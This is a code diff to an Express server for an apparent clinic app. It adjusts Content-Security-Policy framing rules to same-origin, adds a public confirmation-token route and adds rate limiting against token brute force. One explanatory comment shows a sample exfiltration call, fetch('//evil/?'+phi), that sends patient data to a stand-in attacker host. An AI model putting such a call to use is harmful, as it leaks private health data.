@@ -61,7 +61,10 @@ app.use(helmet({
       // no podrá exfiltrar datos via fetch('//evil/?'+phi) — el browser bloquea
       // cualquier destino que no sea el mismo origen.
       connectSrc: ["'self'"],
-      frameAncestors: ["'none'"],
+      // 'self' (no 'none') porque consultation-orthodontics.html embebe
+      // /ortodoncia-design/index.html en un iframe same-origin. Sigue
+      // bloqueando que terceros embeban la app → defensa de clickjacking.
+      frameAncestors: ["'self'"],
       objectSrc: ["'none'"],
       baseUri: ["'self'"],
       formAction: ["'self'"],
@@ -70,7 +73,9 @@ app.use(helmet({
   },
   crossOriginEmbedderPolicy: false,
   crossOriginResourcePolicy: { policy: 'cross-origin' },
-  frameguard: { action: 'deny' },
+  // sameorigin (no deny): legacy X-Frame-Options para navegadores viejos,
+  // mismo criterio que frameAncestors arriba.
+  frameguard: { action: 'sameorigin' },
 }));
 
 // Forzar HTTPS en producción (Render termina TLS en el LB).
@@ -103,6 +108,12 @@ function serveHtmlWithVersion(filePath, res) {
     res.send(html);
   });
 }
+
+// Serve the public confirmation page under /confirmar/:token (la página lee el
+// token de location.pathname y llama a /api/confirmations/public/:token).
+app.get(/^\/confirmar\/[a-f0-9]{32}$/i, (req, res) => {
+  serveHtmlWithVersion(path.join(PUBLIC_DIR, 'confirm.html'), res);
+});
 
 // Intercept *.html requests before express.static so we can inject ?v=… into asset URLs
 app.use((req, res, next) => {
@@ -162,6 +173,17 @@ const publicBookingLimiter = rateLimit({
 });
 app.use('/api/public/clinic/:clinicId/booking', publicBookingLimiter);
 
+// Limita intentos de adivinar tokens de confirmación o spam de respuestas.
+// 60 req/hora por IP es holgado para uso real y frena fuerza bruta.
+const publicConfirmLimiter = rateLimit({
+  windowMs: 60 * 60 * 1000,
+  max: 60,
+  standardHeaders: true,
+  legacyHeaders: false,
+  message: { error: 'Demasiadas solicitudes. Intenta más tarde.' },
+});
+app.use('/api/confirmations/public', publicConfirmLimiter);
+
 // Static files: hint browsers to cache JS/CSS for a day, HTML always revalidated
 const ONE_DAY = 24 * 60 * 60;
 app.use(express.static(path.join(__dirname, 'public'), {
@@ -196,6 +218,7 @@ app.use('/api/consultations', require('./routes/consultations'));
 app.use('/api/appointments', require('./routes/appointments'));
 app.use('/api/consents', require('./routes/consents'));
 app.use('/api/reminders', require('./routes/reminders'));
+app.use('/api/confirmations', require('./routes/confirmations'));
 app.use('/api/assistant', require('./routes/assistant'));
 app.use('/api/assistant', require('./routes/assistant-intent'));
 app.use('/api/conversation', require('./routes/conversation'));
